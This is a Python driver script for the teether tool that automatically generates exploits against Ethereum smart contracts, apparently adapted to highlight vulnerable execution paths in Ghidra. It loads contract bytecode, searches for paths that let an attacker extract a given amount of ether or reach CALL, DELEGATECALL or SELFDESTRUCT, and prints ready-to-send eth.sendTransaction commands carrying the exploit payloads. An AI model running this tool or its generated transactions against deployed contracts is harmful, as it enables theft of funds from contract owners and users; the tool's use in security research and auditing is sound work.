#!/usr/bin/env python3
import json
import logging
import resource
import sys
import ghidra_bridge

from teether.exploit import combined_exploit
from teether.project import Project

# http://code.activestate.com/recipes/577058/

def query_yes_no(question, default="yes"):
    """Ask a yes/no question via raw_input() and return their answer.
    
    "question" is a string that is presented to the user.
    "default" is the presumed answer if the user just hits <Enter>.
        It must be "yes" (the default), "no" or None (meaning
        an answer is required of the user).

    The "answer" return value is one of "yes" or "no".
    """
    valid = {"yes":"yes",   "y":"yes",  "ye":"yes",
             "no":"no",     "n":"no"}
    if default == None:
        prompt = " [y/n] "
    elif default == "yes":
        prompt = " [Y/n] "
    elif default == "no":
        prompt = " [y/N] "
    else:
        raise ValueError("invalid default answer: '%s'" % default)

    while 1:
        sys.stdout.write(question + prompt)
        choice = input().lower()
        if default is not None and choice == '':
            return default
        elif choice in valid.keys():
            return valid[choice]
        else:
            sys.stdout.write("Please respond with 'yes' or 'no' "\
                             "(or 'y' or 'n').\n")

logging.basicConfig(level=logging.INFO)


def hex_encode(d):
    return {k: v.hex() if isinstance(v, bytes) else v for k, v in d.items()}


def main(code_path, target_addr, shellcode_addr, amount, savefile=None, initial_storage_file=None, initial_balance=None,
         flags=None):
    savefilebase = savefile or code_path
    if code_path.endswith('.json'):
        with open(code_path, 'rb') as f:
            jd = json.load(f)
        p = Project.from_json(jd)
    else:
        with open(code_path) as infile:
            inbuffer = infile.read().rstrip()
        code = bytes.fromhex(inbuffer)
        p = Project(code)
        with open('%s.project.json' % savefilebase, 'w') as f:
            json.dump(p.to_json(), f)

    amount_check = '+'
    amount = amount.strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)

    initial_storage = dict()
    if initial_storage_file:
        with open(initial_storage_file, 'rb') as f:
            initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).items()}

    flags = flags or {'CALL', 'CALLCODE', 'DELEGATECALL', 'SELFDESTRUCT'}

    result = combined_exploit(p, int(target_addr, 16), int(shellcode_addr, 16), amount, amount_check,
                              initial_storage, initial_balance, flags=flags)
    if result:

        call, r, model = result

        print(model)

        with open('%s.exploit.json' % savefilebase, 'w') as f:
            json.dump({'paths': [{'index': i, 'path': [ins for ins in res.state.trace if
                                                       ins in p.cfg.bb_addrs or ins == res.state.trace[-1]]} for
                                 i, res in enumerate(r.results)],
                       'calls': [{'index': i, 'call': hex_encode(c)} for i, c in enumerate(call)]}, f)

        for i, res in enumerate(r.results):
            yes = query_yes_no("Found vulnerable path, mark it in Ghidra?")
            print('%d: %s' % (
                i, '->'.join('%x' % i for i in res.state.trace if i in p.cfg.bb_addrs or i == res.state.trace[-1])))
 
            if (yes):
 
                b = ghidra_bridge.GhidraBridge(namespace=globals(), response_timeout=1000) 

                tid = currentProgram.startTransaction("ghidrda evm")

                memory = currentProgram.getMemory()

                ram = memory.getBlock("ram")
                ram_size = ram.getSize()
                ram_addr = ram.getStart()

                for i in res.state.trace:
                    if i in p.cfg.bb_addrs or i == res.state.trace[-1]:
                        print(hex(i))
                        Color = b.remote_import("java.awt.Color")
                        setBackgroundColor(ram_addr.add(i), Color.YELLOW)
        
                currentProgram.endTransaction(tid,True)
        
        
        print(call)
        print
        for c in call:
            if c['caller'] == c['origin']:
                print('eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s, gasPrice:0})' % (
                    c['origin'], c.get('payload', b'').hex(),
                    ", value:%d" % c['value'] if c.get('value', 0) else ''))
            else:
                print('eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x%040x"%s, gasPrice:0})' % (
                    c['origin'], c.get('payload', b'').hex(), c['caller'],
                    ", value:%d" % c['value'] if c.get('value', 0) else ''))

    
        return True
    return False
    

if __name__ == '__main__':
    # limit memory to 8GB
    mem_limit = 8 * 1024 * 1024 * 1024
    try:
        rsrc = resource.RLIMIT_VMEM
    except:
        rsrc = resource.RLIMIT_AS
    resource.setrlimit(rsrc, (mem_limit, mem_limit))

    fields = ['code', 'target-address', 'shellcode-address', 'target_amount', 'savefile', 'initial-storage',
              'initial-balance']
    config = {f: None for f in fields}
    config['flags'] = set()

    field_iter = iter(fields)
    for arg in sys.argv[1:]:
        if arg.startswith('--'):
            config['flags'].add(arg[2:].upper())
        else:
            field = next(field_iter)
            config[field] = arg

    if config['target_amount'] is None:
        print('Usage: %s [flags] <code> <target-address> <shellcode-address> <target_amount> [savefile] [initial-storage file] [initial-balance]' % \
              sys.argv[0], file=sys.stderr)
        exit(-1)

    main(config['code'], config['target-address'], config['shellcode-address'], config['target_amount'],
         config['savefile'], config['initial-storage'], config['initial-balance'], config['flags'])
